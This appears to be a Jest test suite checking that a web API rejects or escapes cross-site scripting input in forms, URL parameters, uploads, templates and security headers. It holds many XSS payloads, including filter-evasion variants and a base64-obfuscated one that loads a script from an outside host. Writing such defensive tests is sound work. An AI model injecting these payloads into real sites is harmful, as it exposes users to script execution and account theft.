import { describe, expect, it, beforeEach, afterEach } from '@jest/globals';
import request from 'supertest';
import { server } from '../../src/server';
import { MakeAPIClient } from '../../src/lib/make-api-client';

describe('XSS Prevention Tests', () => {
    let app: any;
    let mockMakeClient: jest.Mocked<MakeAPIClient>;

    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '<body onload=alert("XSS")>',
        '<input type="image" src=x:x onerror=alert("XSS")>',
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
        '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
        '<style>@import"javascript:alert(\'XSS\')";</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
        '<form><button formaction="javascript:alert(\'XSS\')">Click</button></form>',
        '"><script>alert("XSS")</script>',
        '\';alert("XSS");//',
        '"><img src=x onerror=alert("XSS")>',
        '<script>document.write("<img src=x onerror=alert(\'XSS\')>")</script>',
        '<div style="background-image:url(javascript:alert(\'XSS\'))">',
        '<table background="javascript:alert(\'XSS\')">',
    ];

    const domBasedXSSPayloads = [
        '#<script>alert("XSS")</script>',
        '#javascript:alert("XSS")',
        '?param=<script>alert("XSS")</script>',
        '&callback=<script>alert("XSS")</script>',
        '#"><script>alert("XSS")</script>',
        '?search="><img src=x onerror=alert("XSS")>',
    ];

    beforeEach(() => {
        app = server;
        mockMakeClient = {
            makeRequest: jest.fn(),
            get: jest.fn(),
            post: jest.fn(),
            put: jest.fn(),
            delete: jest.fn(),
            patch: jest.fn()
        } as unknown as jest.Mocked<MakeAPIClient>;
    });

    afterEach(() => {
        jest.clearAllMocks();
    });

    describe('Reflected XSS Prevention', () => {
        xssPayloads.forEach((payload, index) => {
            it(`should sanitize reflected XSS payload ${index + 1}: ${payload.substring(0, 30)}...`, async () => {
                const response = await request(app)
                    .post('/scenarios/create')
                    .send({
                        name: payload,
                        teamId: '12345',
                        blueprint: {
                            name: payload,
                            description: payload
                        }
                    });

                // Should handle malicious input safely
                expect([400, 401, 422]).toContain(response.status);
                
                // Response should not echo back raw script tags
                const responseText = JSON.stringify(response.body);
                expect(responseText).not.toContain('<script>');
                expect(responseText).not.toContain('javascript:');
                expect(responseText).not.toContain('onerror=');
                expect(responseText).not.toContain('onload=');
                expect(responseText).not.toContain('alert(');
                
                // Should not contain unescaped HTML tags
                expect(responseText).not.toMatch(/<(?!\/?(b|i|strong|em)\b)[^>]*>/);
            });
        });
    });

    describe('Stored XSS Prevention', () => {
        xssPayloads.forEach((payload, index) => {
            it(`should prevent stored XSS in scenario descriptions with payload ${index + 1}`, async () => {
                // Attempt to store malicious content
                const createResponse = await request(app)
                    .post('/scenarios/create')
                    .send({
                        name: 'Test Scenario',
                        teamId: '12345',
                        blueprint: {
                            name: 'Test Blueprint',
                            description: payload,
                            flow: [{
                                id: '1',
                                type: 'webhook',
                                parameters: {
                                    url: 'https://example.com',
                                    method: 'POST',
                                    note: payload
                                }
                            }]
                        }
                    });

                expect([400, 401, 422]).toContain(createResponse.status);
                
                // If creation succeeded (shouldn't), verify retrieval is safe
                if (createResponse.status === 201) {
                    const retrieveResponse = await request(app)
                        .get(`/scenarios/${createResponse.body.id}`);
                    
                    const retrievedText = JSON.stringify(retrieveResponse.body);
                    expect(retrievedText).not.toContain('<script>');
                    expect(retrievedText).not.toContain('javascript:');
                    expect(retrievedText).not.toContain('onerror=');
                    
                    // Verify HTML is properly escaped
                    expect(retrievedText).not.toMatch(/<(?!\/?(b|i|strong|em)\b)[^>]*>/);
                }
            });
        });
    });

    describe('DOM-based XSS Prevention', () => {
        domBasedXSSPayloads.forEach((payload, index) => {
            it(`should prevent DOM-based XSS with payload ${index + 1}: ${payload}`, async () => {
                const response = await request(app)
                    .get(`/scenarios/list${payload}`)
                    .query({
                        teamId: '12345',
                        search: payload
                    });

                // Should handle malicious parameters safely
                expect([400, 401, 404, 422]).toContain(response.status);
                
                // Response should not contain unescaped JavaScript
                const responseText = JSON.stringify(response.body);
                expect(responseText).not.toContain('<script>');
                expect(responseText).not.toContain('javascript:');
                expect(responseText).not.toContain('alert(');
                
                // Headers should include XSS protection
                expect(response.headers['x-content-type-options']).toBe('nosniff');
                expect(response.headers['x-frame-options']).toMatch(/DENY|SAMEORIGIN/);
            });
        });
    });

    describe('User Input Sanitization', () => {
        const userInputFields = [
            'name', 'description', 'email', 'note', 'comment', 'title'
        ];

        userInputFields.forEach(field => {
            xssPayloads.forEach((payload, index) => {
                it(`should sanitize ${field} field with XSS payload ${index + 1}`, async () => {
                    const requestBody: any = {
                        teamId: '12345'
                    };
                    requestBody[field] = payload;

                    const response = await request(app)
                        .post('/users/create')
                        .send(requestBody);

                    expect([400, 401, 422]).toContain(response.status);
                    
                    const responseText = JSON.stringify(response.body);
                    expect(responseText).not.toContain('<script>');
                    expect(responseText).not.toContain('javascript:');
                    expect(responseText).not.toContain('onerror=');
                });
            });
        });
    });

    describe('JSON Response XSS Prevention', () => {
        it('should prevent XSS in JSON responses', async () => {
            const maliciousData = {
                name: '</script><script>alert("XSS")</script>',
                description: '{"key": "<script>alert(\\"XSS\\")</script>"}',
                metadata: {
                    note: '<img src=x onerror=alert("XSS")>',
                    tags: ['<script>alert("XSS")</script>', 'normal-tag']
                }
            };

            const response = await request(app)
                .post('/scenarios/create')
                .send({
                    ...maliciousData,
                    teamId: '12345'
                });

            expect([400, 401, 422]).toContain(response.status);
            
            // Verify response is properly encoded
            const responseText = response.text;
            expect(responseText).not.toContain('</script><script>');
            expect(responseText).not.toContain('<img src=x onerror=');
            
            // Verify proper JSON encoding
            if (response.body && typeof response.body === 'object') {
                const serialized = JSON.stringify(response.body);
                expect(serialized).not.toContain('<script>');
                expect(serialized).not.toContain('onerror=');
            }
        });

        it('should prevent XSS in error messages', async () => {
            const response = await request(app)
                .post('/scenarios/create')
                .send({
                    name: '<script>alert("XSS")</script>',
                    teamId: '<img src=x onerror=alert("XSS")>',
                    invalidField: '"><script>alert("XSS")</script>'
                });

            expect([400, 401, 422]).toContain(response.status);
            
            // Error messages should not contain unescaped user input
            if (response.body.error || response.body.message) {
                const errorText = response.body.error || response.body.message;
                expect(errorText).not.toContain('<script>');
                expect(errorText).not.toContain('onerror=');
                expect(errorText).not.toContain('javascript:');
            }
        });
    });

    describe('Content Security Policy Headers', () => {
        it('should include proper CSP headers', async () => {
            const response = await request(app)
                .get('/scenarios/list')
                .query({ teamId: '12345' });

            // Should include CSP headers
            expect(response.headers['content-security-policy']).toBeDefined();
            
            const csp = response.headers['content-security-policy'];
            if (csp) {
                expect(csp).toMatch(/script-src[^;]*'strict-dynamic'|script-src[^;]*'self'/);
                expect(csp).toMatch(/object-src[^;]*'none'/);
                expect(csp).toMatch(/base-uri[^;]*'self'/);
            }
        });

        it('should prevent inline script execution', async () => {
            const response = await request(app)
                .get('/scenarios/list')
                .query({ teamId: '12345' });

            const csp = response.headers['content-security-policy'];
            if (csp) {
                // Should not allow unsafe-inline for scripts
                expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
                // Should not allow unsafe-eval
                expect(csp).not.toMatch(/script-src[^;]*'unsafe-eval'/);
            }
        });
    });

    describe('URL Parameter XSS Prevention', () => {
        xssPayloads.forEach((payload, index) => {
            it(`should sanitize URL parameters with XSS payload ${index + 1}`, async () => {
                const response = await request(app)
                    .get('/scenarios/search')
                    .query({
                        q: payload,
                        filter: payload,
                        sort: payload,
                        teamId: '12345'
                    });

                expect([400, 401, 404, 422]).toContain(response.status);
                
                // URL parameters should not be reflected unsanitized
                const responseText = JSON.stringify(response.body);
                expect(responseText).not.toContain('<script>');
                expect(responseText).not.toContain('javascript:');
                expect(responseText).not.toContain('onerror=');
            });
        });
    });

    describe('File Upload XSS Prevention', () => {
        const maliciousFileContents = [
            '<script>alert("XSS")</script>',
            '<?xml version="1.0"?><script>alert("XSS")</script>',
            'GIF89a<script>alert("XSS")</script>',
            '%3Cscript%3Ealert("XSS")%3C/script%3E'
        ];

        maliciousFileContents.forEach((content, index) => {
            it(`should prevent XSS in file uploads with content ${index + 1}`, async () => {
                const response = await request(app)
                    .post('/files/upload')
                    .field('teamId', '12345')
                    .field('description', '<script>alert("XSS")</script>')
                    .attach('file', Buffer.from(content), {
                        filename: '<script>alert("XSS")</script>.txt',
                        contentType: 'text/plain'
                    });

                expect([400, 401, 413, 422]).toContain(response.status);
                
                // Should not process malicious filenames or content
                const responseText = JSON.stringify(response.body);
                expect(responseText).not.toContain('<script>');
                expect(responseText).not.toContain('onerror=');
            });
        });
    });

    describe('Template and Email XSS Prevention', () => {
        it('should prevent XSS in email templates', async () => {
            const response = await request(app)
                .post('/notifications/send')
                .send({
                    to: 'test@example.com',
                    subject: '<script>alert("XSS")</script>',
                    body: '<img src=x onerror=alert("XSS")>',
                    teamId: '12345'
                });

            expect([400, 401, 422]).toContain(response.status);
            
            // Should not include unescaped content in templates
            const responseText = JSON.stringify(response.body);
            expect(responseText).not.toContain('<script>');
            expect(responseText).not.toContain('onerror=');
        });

        it('should sanitize webhook payload templates', async () => {
            const response = await request(app)
                .post('/scenarios/create')
                .send({
                    name: 'Test Scenario',
                    teamId: '12345',
                    blueprint: {
                        name: 'Test Blueprint',
                        flow: [{
                            id: '1',
                            type: 'webhook',
                            parameters: {
                                url: 'https://example.com',
                                body: '{"message": "<script>alert(\\"XSS\\")</script>"}',
                                headers: {
                                    'X-Custom': '<img src=x onerror=alert("XSS")>'
                                }
                            }
                        }]
                    }
                });

            expect([400, 401, 422]).toContain(response.status);
            
            const responseText = JSON.stringify(response.body);
            expect(responseText).not.toContain('<script>');
            expect(responseText).not.toContain('onerror=');
        });
    });

    describe('Advanced XSS Prevention', () => {
        const advancedXSSPayloads = [
            // Polyglot payloads
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*/+/onmouseover=1/+/[*/[]/+alert(1)//'>',
            '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLmlzL1lrTm1pI jbml4Ijtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGEp onerror=eval(atob(this.id))>',
            
            // Context-breaking payloads
            '\'-alert(1)-\'',
            '\\\';alert(1);//',
            '</script><script>alert(1)</script>',
            
            // Filter evasion
            '<SCRİPT>alert(1)</SCRİPT>',
            '<script>al\x65rt(1)</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            
            // Event handler variations
            '<svg><animate onbegin=alert(1) attributeName=x>',
            '<input autofocus onfocus=alert(1)>',
            '<select onfocus=alert(1) autofocus>',
        ];

        advancedXSSPayloads.forEach((payload, index) => {
            it(`should prevent advanced XSS technique ${index + 1}`, async () => {
                const response = await request(app)
                    .post('/scenarios/create')
                    .send({
                        name: payload,
                        teamId: '12345',
                        blueprint: {
                            name: 'Test',
                            description: payload
                        }
                    });

                expect([400, 401, 422]).toContain(response.status);
                
                const responseText = JSON.stringify(response.body);
                expect(responseText).not.toMatch(/alert\s*\(/);
                expect(responseText).not.toMatch(/javascript:/);
                expect(responseText).not.toMatch(/on\w+\s*=/);
                expect(responseText).not.toContain('<script');
                expect(responseText).not.toContain('<svg');
            });
        });
    });
});